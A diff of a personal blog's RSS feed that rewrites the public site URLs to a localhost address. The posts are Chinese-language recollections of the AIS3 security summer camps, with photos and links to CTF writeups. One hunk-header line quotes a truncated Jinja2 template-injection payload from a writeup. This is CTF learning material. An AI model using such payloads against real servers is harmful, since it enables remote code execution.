 	width=&#34;1799&#34;
 	height=&#34;1560&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-3_hu_a31e94b9ab2b9f0e.png 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-3_hu_ef64e3e75d65acad.png 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-3_hu_a31e94b9ab2b9f0e.png 480w, http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image-3_hu_ef64e3e75d65acad.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Ya! 不用肚子痛還要熬夜做簡報了&#34;
@@ -839,10 +839,10 @@ payload:&lt;code&gt;{{request[&#39;application&#39;][&#39;\x5f\x5fglobals\x5f\x5
 &lt;h1 id=&#34;day-46&#34;&gt;Day 4~6
 &lt;/h1&gt;&lt;p&gt;廢了一下就跑去 HITCON 玩，還拿了瓶 DEVCORE CONFERENCE 沒拿到的酒（但那時候也沒滿 18&lt;br&gt;
 這兩個 Conf 文章我會盡快補上 QAQ&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/1.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/1.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/1_hu_a6b44e25dff1788c.jpg 480w, https://agong88.github.io/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/1_hu_c8eae1dd229792d.jpg 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/1_hu_a6b44e25dff1788c.jpg 480w, http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/1_hu_c8eae1dd229792d.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;時隔五個月又拿到了&#34;
@@ -857,11 +857,11 @@ payload:&lt;code&gt;{{request[&#39;application&#39;][&#39;\x5f\x5fglobals\x5f\x5
         </item>
         <item>
         <title>2025 AIS3 心得</title>
-        <link>https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/</link>
+        <link>http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/</link>
         <pubDate>Wed, 13 Aug 2025 00:00:00 +0800</pubDate>
         
-        <guid>https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/</guid>
-        <description>&lt;img src="https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/image.png" alt="Featured image of post 2025 AIS3 心得" /&gt;&lt;h1 id=&#34;前言&#34;&gt;前言
+        <guid>http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/</guid>
+        <description>&lt;img src="http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/image.png" alt="Featured image of post 2025 AIS3 心得" /&gt;&lt;h1 id=&#34;前言&#34;&gt;前言
 &lt;/h1&gt;&lt;p&gt;我看大部分的人都有寫介紹跟選組，還是意思意思寫一下好了&lt;br&gt;
 AIS3：Advanced Information Security - Summer School&lt;br&gt;
 就是在七天內跟你的隊友快速磨合然後一起產出專題的營隊，當然除了專題以外還有課程，上面 AIS3 的全名有看到 Advanced，顧名思義裡面的課都蠻硬的而且睡眠時間很少☠️&lt;/p&gt;
@@ -876,10 +876,10 @@ AIS3：Advanced Information Security - Summer School&lt;br&gt;
 &lt;h1 id=&#34;day0&#34;&gt;Day0
 &lt;/h1&gt;&lt;p&gt;這天很酷，與還不認識的組員聊天，結果發現即使兩人互不認識但共友卻蠻多，只能說資訊圈真小&lt;br&gt;
 &lt;del&gt;當然還要在 Day0 能玩的時候玩個久沒玩的 GTA&lt;/del&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/13.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/13.jpg&#34;
 	width=&#34;2048&#34;
 	height=&#34;1536&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/13_hu_da87c8a4dce5fd62.jpg 480w, https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/13_hu_9937dd354e00fb61.jpg 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/13_hu_da87c8a4dce5fd62.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/13_hu_9937dd354e00fb61.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;GTA&#34;
@@ -892,10 +892,10 @@ AIS3：Advanced Information Security - Summer School&lt;br&gt;
 &gt;&lt;/p&gt;
 &lt;h1 id=&#34;day1&#34;&gt;Day1
 &lt;/h1&gt;&lt;p&gt;一早看到整個禮拜的課表就順便拍了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/2.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/2.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/2_hu_1d8b9a6ced62055.jpg 480w, https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/2_hu_e7a34ce312236dbb.jpg 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/2_hu_1d8b9a6ced62055.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/2_hu_e7a34ce312236dbb.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;七天的課表&#34;
@@ -911,10 +911,10 @@ AIS3：Advanced Information Security - Summer School&lt;br&gt;
 午餐是免費 Subway，免費的就是讚&lt;br&gt;
 下午的課就還聽得懂&lt;br&gt;
 破冰還不錯玩，我們解了三題&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/14.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/14.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/14_hu_51cdffd18e617ca4.jpg 480w, https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/14_hu_b40ff4380f23ff04.jpg 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/14_hu_51cdffd18e617ca4.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/14_hu_b40ff4380f23ff04.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;破冰活動&#34;
@@ -928,10 +928,10 @@ AIS3：Advanced Information Security - Summer School&lt;br&gt;
 &lt;h1 id=&#34;day2&#34;&gt;Day2
 &lt;/h1&gt;&lt;p&gt;Day2 大部分聽起來都還好，但量子資安我真聽不懂&lt;br&gt;
 晚上的炸雞比薩飲料吃到飽不錯，吃的蠻爽的，我隊友還拿了一盒完整的比薩回宿舍配討論專題&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/12.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/12.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/12_hu_c62b30b429b42641.jpg 480w, https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/12_hu_fb3ed8f033043be5.jpg 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/12_hu_c62b30b429b42641.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/12_hu_fb3ed8f033043be5.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;討論專題題目&#34;
@@ -954,10 +954,10 @@ AIS3：Advanced Information Security - Summer School&lt;br&gt;
 &lt;h1 id=&#34;day6&#34;&gt;Day6
 &lt;/h1&gt;&lt;p&gt;Day6 早上基本不是在睡覺就是在準備講稿（但後面都沒用到&lt;br&gt;
 很快就到了中午，想說報告前太累了必須吃個好的，所以吃了前幾天預算兩倍的午餐，結果後面幾餐都想說報告完了吃好的都點超貴，錢噴的超快😢&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/4.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/4.jpg&#34;
 	width=&#34;2048&#34;
 	height=&#34;1536&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/4_hu_b371c2bdaab5a8f6.jpg 480w, https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/4_hu_eeeedde002fe44bb.jpg 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/4_hu_b371c2bdaab5a8f6.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/4_hu_eeeedde002fe44bb.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;報告ㄉ圖片&#34;
@@ -970,10 +970,10 @@ AIS3：Advanced Information Security - Summer School&lt;br&gt;
 &gt;&lt;/p&gt;
 &lt;p&gt;後面報告我覺得就普普通通，但有兩個評審好像對我們蠻有興趣的，不是穩拿最佳專題就是沒料，但我想說反正第一次來 AIS3 能拿到結業證書就好，所以就去吃 costco 了，結果也沒吃到又跑回來吃女宿麥當勞&lt;br&gt;
 晚上原本想說早早洗洗睡但想起我買 200 分鐘的 oloo 還有 100 分鐘，所以就自己出去繞了繞清大和清大夜市&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/11.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/11.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/11_hu_5201773f74381f2.jpg 480w, https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/11_hu_6169ddbf9fd91173.jpg 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/11_hu_5201773f74381f2.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/11_hu_6169ddbf9fd91173.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;清大夜市&#34;
@@ -983,10 +983,10 @@ AIS3：Advanced Information Security - Summer School&lt;br&gt;
 		data-flex-grow=&#34;75&#34;
 		data-flex-basis=&#34;180px&#34;
 	
-&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/7.jpg&#34;
+&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/7.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/7_hu_12956f001549f6aa.jpg 480w, https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/7_hu_55a17eab119a176a.jpg 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/7_hu_12956f001549f6aa.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/7_hu_55a17eab119a176a.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;清大校門口&#34;
@@ -998,10 +998,10 @@ AIS3：Advanced Information Security - Summer School&lt;br&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;騎回來結果還有 50 分鐘，跑去地下是看大家捲的如何，&lt;del&gt;看到有人已經打下 Windows 了&lt;/del&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/3.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/3.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/3_hu_949c38f6c53d0b2b.jpg 480w, https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/3_hu_38481d928c98dcf9.jpg 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/3_hu_949c38f6c53d0b2b.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/3_hu_38481d928c98dcf9.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;被打下的 Windows&#34;
@@ -1013,10 +1013,10 @@ AIS3：Advanced Information Security - Summer School&lt;br&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;後來 1.多吃完宵夜睡不著，又跑出去騎了半小時的 oloo，看到了這慘狀&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/6.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/6.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/6_hu_b03233d3bd0de576.jpg 480w, https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/6_hu_886f76dbe8e76dda.jpg 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/6_hu_b03233d3bd0de576.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/6_hu_886f76dbe8e76dda.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;斷頭 oloo&#34;
@@ -1028,10 +1028,10 @@ AIS3：Advanced Information Security - Summer School&lt;br&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;但也是有不錯的景，但被我拍得很爛&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/10.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/10.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/10_hu_da6358b3c815cb9.jpg 480w, https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/10_hu_f84dd5c48df3081d.jpg 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/10_hu_da6358b3c815cb9.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/10_hu_f84dd5c48df3081d.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;凌晨的竹湖&#34;
@@ -1046,10 +1046,10 @@ AIS3：Advanced Information Security - Summer School&lt;br&gt;
 &lt;h1 id=&#34;day7&#34;&gt;Day7
 &lt;/h1&gt;&lt;p&gt;這天早上基本都在睡覺，只有起來聽幾個報告&lt;br&gt;
 下午就起床領個獎就差不多回去準備隔天暑輔了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/8.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/8.jpg&#34;
 	width=&#34;2048&#34;
 	height=&#34;1362&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/8_hu_1ec9a205569fb382.jpg 480w, https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/8_hu_e02e570c5d4b787e.jpg 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/8_hu_1ec9a205569fb382.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/8_hu_e02e570c5d4b787e.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;感謝所有隊友 ヾ(@^▽^@)ノ&#34;
@@ -1062,10 +1062,10 @@ AIS3：Advanced Information Security - Summer School&lt;br&gt;
 &gt;&lt;/p&gt;
 &lt;p&gt;領獎的時候聽到有女傑斯衣服眼睛都亮了起來👀&lt;br&gt;
 看到有我的號碼立刻選&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/5.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/5.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/5_hu_800ed5dc4ba968ad.jpg 480w, https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/5_hu_3d5fde8135b4847f.jpg 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/5_hu_800ed5dc4ba968ad.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/5_hu_3d5fde8135b4847f.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;所有獎品&#34;
@@ -1077,10 +1077,10 @@ AIS3：Advanced Information Security - Summer School&lt;br&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;當然也要和 AIS3 牌子合照（可惜忘記拍獨照了QQ&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/9.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/9.jpg&#34;
 	width=&#34;4032&#34;
 	height=&#34;3024&#34;
-	srcset=&#34;https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/9_hu_77d36d40723fcae5.jpg 480w, https://agong88.github.io/post/2025-ais3-%E5%BF%83%E5%BE%97/9_hu_ad506a54d6c12e8.jpg 1024w&#34;
+	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/9_hu_77d36d40723fcae5.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/9_hu_ad506a54d6c12e8.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;組內牌子前合照&#34;
@@ -1111,10 +1111,10 @@ AIS3：Advanced Information Security - Summer School&lt;br&gt;
         </item>
         <item>
         <title>2025 AIS3 Pre-exam Writeup</title>
-        <link>https://agong88.github.io/post/2025-ais3-pre-exam-writeup/</link>
+        <link>http://localhost:50608/post/2025-ais3-pre-exam-writeup/</link>
         <pubDate>Mon, 26 May 2025 00:00:00 +0800</pubDate>
         
-        <guid>https://agong88.github.io/post/2025-ais3-pre-exam-writeup/</guid>
+        <guid>http://localhost:50608/post/2025-ais3-pre-exam-writeup/</guid>
         <description>&lt;img src="https://hackmd.io/_uploads/HkXttAUMge.png" alt="Featured image of post 2025 AIS3 Pre-exam Writeup" /&gt;&lt;h2 id=&#34;名次&#34;&gt;名次
 &lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://hackmd.io/_uploads/HkXttAUMge.png&#34;
 	
@@ -1828,10 +1828,10 @@ exploit：&lt;/p&gt;
         </item>
         <item>
         <title>Hello World</title>
-        <link>https://agong88.github.io/post/hello-world/</link>
+        <link>http://localhost:50608/post/hello-world/</link>
         <pubDate>Sat, 12 Apr 2025 21:52:19 +0800</pubDate>
         
-        <guid>https://agong88.github.io/post/hello-world/</guid>
+        <guid>http://localhost:50608/post/hello-world/</guid>
         <description>&lt;p&gt;10/24 更：我會減少拖延症，多產出文章&lt;br&gt;
 買了 PM3，有空多更新反體中文技術文章上來&lt;/p&gt;
 &lt;p&gt;另外我在做這Blog的時候不知道哪根腦筋不對做了雙語言，雖然更新起來要花些時間，但看起來蠻不錯的（對吧？&lt;/p&gt;
@@ -1839,11 +1839,11 @@ exploit：&lt;/p&gt;
         </item>
         <item>
         <title>2024 AIS3 Junior LLMㄉWriteup</title>
-        <link>https://agong88.github.io/post/2024-ais3-junior-llm%E3%84%89writeup/</link>
+        <link>http://localhost:50608/post/2024-ais3-junior-llm%E3%84%89writeup/</link>
         <pubDate>Sun, 18 Aug 2024 00:00:00 +0800</pubDate>
         
-        <guid>https://agong88.github.io/post/2024-ais3-junior-llm%E3%84%89writeup/</guid>
-        <description>&lt;img src="https://agong88.github.io/post/2024-ais3-junior-llm%E3%84%89writeup/image.png" alt="Featured image of post 2024 AIS3 Junior LLMㄉWriteup" /&gt;&lt;h1 id=&#34;ais3-junior-llm-writeup&#34;&gt;AIS3 Junior LLM Writeup
+        <guid>http://localhost:50608/post/2024-ais3-junior-llm%E3%84%89writeup/</guid>
+        <description>&lt;img src="http://localhost:50608/post/2024-ais3-junior-llm%E3%84%89writeup/image.png" alt="Featured image of post 2024 AIS3 Junior LLMㄉWriteup" /&gt;&lt;h1 id=&#34;ais3-junior-llm-writeup&#34;&gt;AIS3 Junior LLM Writeup
 &lt;/h1&gt;&lt;h2 id=&#34;感受gptㄉ魔力吧&#34;&gt;感受GPTㄉ魔力吧
 &lt;/h2&gt;&lt;p&gt;執行 nc 後出來一堆喵&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://hackmd.io/_uploads/HkfrKthcA.png&#34;
@@ -2413,10 +2413,10 @@ exploit：&lt;/p&gt;
         </item>
         <item>
         <title>2024 AIS3 Junior WebㄉWriteup</title>
-        <link>https://agong88.github.io/post/2024-ais3-junior-web%E3%84%89writeup/</link>
+        <link>http://localhost:50608/post/2024-ais3-junior-web%E3%84%89writeup/</link>
         <pubDate>Sun, 18 Aug 2024 00:00:00 +0800</pubDate>
         
-        <guid>https://agong88.github.io/post/2024-ais3-junior-web%E3%84%89writeup/</guid>
+        <guid>http://localhost:50608/post/2024-ais3-junior-web%E3%84%89writeup/</guid>
         <description>&lt;h1 id=&#34;ais3-junior-web-writeup&#34;&gt;AIS3 Junior Web Writeup
 &lt;/h1&gt;&lt;h2 id=&#34;bac01&#34;&gt;BAC01
 &lt;/h2&gt;&lt;p&gt;看到輸入框隨便填個 1 看看&lt;/p&gt;
